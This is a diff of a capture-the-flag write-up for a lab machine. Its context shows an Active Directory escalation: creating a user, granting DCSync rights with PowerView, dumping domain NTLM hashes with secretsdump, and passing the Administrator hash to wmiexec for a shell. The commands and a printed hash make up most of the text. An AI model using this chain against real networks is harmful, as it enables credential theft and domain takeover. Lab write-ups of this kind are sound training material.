@@ -227,14 +227,13 @@ through nested membership. Click on 9 to reveal the membership graph.
 - The WriteDACL privilege gives a user the ability to add ACLs to an object
 - This means that we can add a user to this group and give them DCSync privileges
 - add a new user to Exchange Windows Permissions as well as the Remote Management Users group.
-- ```
+```
   *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net user islam iso12345 /add /domain
 The command completed successfully.
 
 *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net group "Exchange Windows Permissions" islam /add /domain
 The command completed successfully.
-
-  ```
+```
 - download the PowerView script and import it into the current session
 ```
 . ./Powerview.ps1
@@ -247,6 +246,7 @@ The command completed successfully.
 *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> Add-ObjectAcl -PrincipalIdentity islam -Credential $Cred -TargetIdentity htb.local -Rights DCSync
 ```
 - run secretsdump.py  script from Impacket can now be run as islam, and used to reveal the NTLM hashes for all domain users
+  
 ```
 impacket-secretsdump htb/islam:iso12345@10.10.10.161 
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -260,3 +260,4 @@ htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d
 ```
 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
 ```
+- and shell with admin root flag on desktop
